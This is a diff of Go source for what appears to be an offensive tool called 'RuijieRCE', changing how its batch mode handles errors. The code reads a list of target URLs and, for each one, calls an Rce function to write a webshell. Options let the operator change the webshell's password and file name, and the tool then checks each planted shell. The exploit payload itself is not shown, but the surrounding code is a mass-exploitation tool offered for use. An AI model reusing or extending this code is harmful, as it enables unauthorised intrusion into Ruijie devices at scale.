@@ -184,12 +184,10 @@ func judge(urll string)  {
 	}
 }
 
-func batch(shell, file string) error {
+func batch(shell, file string)  {
 	fi, err := os.Open(file)
 	if err != nil {
 		fmt.Printf("\033[1;31m%s%v\033[0m\n","请输入正确信息", err)
-		return err
-		os.Exit(0)
 	}
 	defer fi.Close()
 
@@ -197,16 +195,16 @@ func batch(shell, file string) error {
 	for  {
 		urll, _, eof := br.ReadLine()
 		if eof == io.EOF {
-			break
+			os.Exit(0)
 		}
 		target, shellname := Url(string(urll))
 		urlll, err := Rce(target, shellname, shell, header)
 		if err != nil {
-			return err
+			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]写入失败：" + URL + "", err)
+			continue
 		}
 		judge(urlll)
 	}
-	return nil
 }
 
 func Menu()  {
@@ -284,35 +282,23 @@ func main()  {
 		judge(urll)
 
 	case URL == "" && FILE != "" && PASS == "" && NAME == "":
-		err := batch(string(shellcode), FILE)
-		if err != nil {
-			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]Error", err)
-			fmt.Print("\n")
-		}
+		batch(string(shellcode), FILE)
+
 
 	case URL == "" && FILE != "" && PASS != "" && NAME == "":
 		shell := changePass(PASS)
-		err := batch(shell, FILE)
-		if err != nil {
-			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]Error", err)
-			fmt.Print("\n")
-		}
+		batch(shell, FILE)
+
 
 	case URL == "" && FILE != "" && PASS == "" && NAME != "":
 		shell := changeName(NAME)
-		err := batch(shell, FILE)
-		if err != nil {
-			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]Error", err)
-			fmt.Print("\n")
-		}
+		batch(shell, FILE)
+
 
 	case URL == "" && FILE != "" && PASS != "" && NAME != "":
 		shell := changeAll(PASS, NAME)
-		err := batch(shell, FILE)
-		if err != nil {
-			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]Error", err)
-			fmt.Print("\n")
-		}
+		batch(shell, FILE)
+
 
 	default:
 		fmt.Printf("\033[1;31m%s\033[0m\n","请输入正确信息 ./RuijieRCE -h 查看参数信息")
